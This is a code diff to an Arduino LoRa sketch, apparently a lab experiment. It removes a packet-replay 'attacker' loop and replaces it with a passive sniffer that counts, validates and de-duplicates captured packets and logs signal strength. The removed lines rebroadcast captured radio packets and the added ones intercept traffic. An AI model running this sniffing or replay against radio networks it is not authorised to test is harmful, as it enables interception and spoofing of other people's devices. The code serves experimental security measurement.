@@ -17,32 +17,32 @@ This code is for educational purposes only. Unauthorized use may be illegal and 
 
 // ===== PARAM =====
 const uint32_t EXPECTED = 200;
-const unsigned long TIMEOUT = 50000;
-const unsigned long replayInterval = 3000;
-
-// ===== DATA =====
-String lastPacket = "";
-unsigned long lastReplay = 0;
-unsigned long lastRecvTime = 0;
-
-bool started = false;
-bool done = false;
 
 // ===== METRICS =====
 uint32_t sniffedCount = 0;
-uint32_t replayCount = 0;
+uint32_t decodedCount = 0;
+uint32_t invalidCount = 0;
+
+// ===== OPTIONAL UNIQUE TRACK =====
+bool seen[EXPECTED] = {false};
 uint32_t uniqueCount = 0;
 uint32_t duplicateCount = 0;
 
-bool seen[EXPECTED] = {false};
+// ===== TIMEOUT LOGIC =====
+unsigned long lastRecvTime = 0;
+bool started = false;
+bool done = false; // Flag biar summary cuma ke-print sekali
 
-// ===== PARSE ID =====
-bool getID(String data, uint32_t &id) {
+// ===== VALIDATION =====
+bool isValidPayload(String data, uint32_t &id) {
   int p1 = data.indexOf(',');
-  if (p1 == -1) return false;
+  int p2 = data.indexOf(',', p1 + 1);
+
+  if (p1 == -1 || p2 == -1) return false;
 
   String idStr = data.substring(0, p1);
 
+  // cek ID numeric
   for (int i = 0; i < idStr.length(); i++) {
     if (!isDigit(idStr[i])) return false;
   }
@@ -51,21 +51,22 @@ bool getID(String data, uint32_t &id) {
   return true;
 }
 
-// ===== SUMMARY =====
 void printSummary() {
-  Serial.println("\n=== ATTACKER SUMMARY ===");
-
   float sniffRate = (sniffedCount * 100.0) / EXPECTED;
-  float replayRate = (sniffedCount > 0) ? (replayCount * 100.0 / sniffedCount) : 0;
+  // Cegah pembagian dengan nol
+  float decodeRate = (sniffedCount > 0) ? ((decodedCount * 100.0) / sniffedCount) : 0;
 
-  Serial.print("Sniffed: "); Serial.println(sniffedCount);
-  Serial.print("Replay Sent: "); Serial.println(replayCount);
+  Serial.println("\n=== SNIFFER SUMMARY ===");
+
+  Serial.print("Sniffed Total: "); Serial.println(sniffedCount);
+  Serial.print("Decoded Valid: "); Serial.println(decodedCount);
+  Serial.print("Invalid: "); Serial.println(invalidCount);
 
   Serial.print("Unique: "); Serial.println(uniqueCount);
   Serial.print("Duplicate: "); Serial.println(duplicateCount);
 
   Serial.print("Sniff Success (%): "); Serial.println(sniffRate);
-  Serial.print("Replay Ratio (%): "); Serial.println(replayRate);
+  Serial.print("Decode Success (%): "); Serial.println(decodeRate);
 }
 
 void setup() {
@@ -85,30 +86,33 @@ void setup() {
 
   LoRa.receive();
 
-  Serial.println("Attacker Ready (Sniff + Replay + Summary)");
+  Serial.println("Sniffer + Summary Ready (With Timeout)...");
 }
 
 void loop() {
-  if (done) return;
+  if (done) return; // Kalau udah selesai, stop proses
 
-  // =========================
-  // SNIFF
-  // =========================
   int packetSize = LoRa.parsePacket();
 
   if (packetSize) {
+    // ===== UPDATE TIMER =====
     lastRecvTime = millis();
     started = true;
 
-    String received = "";
-    while (LoRa.available()) {
-      received += (char)LoRa.read();
-    }
-
     sniffedCount++;
 
-    uint32_t id;
-    if (getID(received, id)) {
+    String data = "";
+    while (LoRa.available()) {
+      data += (char)LoRa.read();
+    }
+
+    uint32_t id = 0;
+    bool valid = isValidPayload(data, id);
+
+    if (valid) {
+      decodedCount++;
+
+      // ===== UNIQUE / DUPLICATE =====
       if (id < EXPECTED) {
         if (!seen[id]) {
           seen[id] = true;
@@ -117,37 +121,34 @@ void loop() {
           duplicateCount++;
         }
       }
+    } else {
+      invalidCount++;
     }
 
+    // ===== LOG =====
     Serial.print("[SNIFF] ");
-    Serial.println(received);
+    Serial.print(data);
 
-    lastPacket = received;
+    Serial.print(" | RSSI=");
+    Serial.print(LoRa.packetRssi());
+
+    Serial.print(" | SNR=");
+    Serial.print(LoRa.packetSnr());
+
+    if (!valid) Serial.print(" | INVALID");
+
+    Serial.println();
+
+    // Kalau pas beruntung nangkep 200 tanpa loss
+    if (sniffedCount >= EXPECTED) {
+      printSummary();
+      done = true;
+    }
   }
 
-  // =========================
-  // REPLAY
-  // =========================
-  if (lastPacket != "" && millis() - lastReplay > replayInterval) {
-    lastReplay = millis();
-
-    Serial.print("[REPLAY] ");
-    Serial.println(lastPacket);
-
-    LoRa.beginPacket();
-    LoRa.print(lastPacket);
-    LoRa.endPacket();
-
-    replayCount++;
-
-    LoRa.receive();
-  }
-
-  // =========================
-  // TIMEOUT STOP
-  // =========================
-  if (started && (millis() - lastRecvTime > TIMEOUT)) {
-    Serial.println("\n[TIMEOUT] Attack session selesai");
+  // ===== TIMEOUT LOGIC (50 Detik) =====
+  if (started && !done && (millis() - lastRecvTime > 50000)) {
+    Serial.println("\n[TIMEOUT] 50 Detik tidak ada paket baru. Sesi Sniffing dianggap selesai.");
     printSummary();
     done = true;
   }
